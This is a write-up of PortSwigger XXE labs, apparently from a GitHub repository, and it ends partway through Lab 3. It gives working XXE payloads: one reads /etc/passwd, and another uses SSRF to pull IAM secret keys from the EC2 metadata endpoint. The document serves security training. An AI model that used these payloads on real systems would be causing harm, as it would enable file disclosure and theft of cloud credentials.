# XML External Entity (XXE) injection

## Lab 1: Exploiting XXE using external entities to retrieve files

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

To solve the lab, inject an XML external entity to retrieve the contents of the /etc/passwd file

### Sol :

* Click `check stock` button and intercept the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/cb985550-dc41-473f-bd2f-39d16da37bc2)

* Give the below payload between the XML declaration and `stockcheck` element.

      <!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>

* Replace the `productID` with `&xxe;`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/5f826b3e-8fdc-4d27-8692-a3656cde0dba)

* Forward the request. We will get the `passwd` file
* Thus, the lab is solved.

## Lab 2: Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint.

### Sol :

* Click `check stock` button and intercept the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/d3bb9191-7155-4b48-8e75-6714d1ea5ecd)

* Give the below payload between the XML declaration and `stockcheck` element.

      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>

* Replace the `productID` with `&xxe;`

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/cb1bcdbc-db7b-452b-beb8-3ae06eac84e8)

* Forward the request. We will obtain the server's IAM secret access key from the EC2 metadata endpoint.
* Thus, the lab is solved.

## Lab 3: Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator

### Sol :

* Click `check stock` button and intercept the request.

![image](https://github.com/tousif13/Port_Swigger_Labs/assets/33444140/77c4c68d-69c0-4628-88f8-37d08cb2278c)

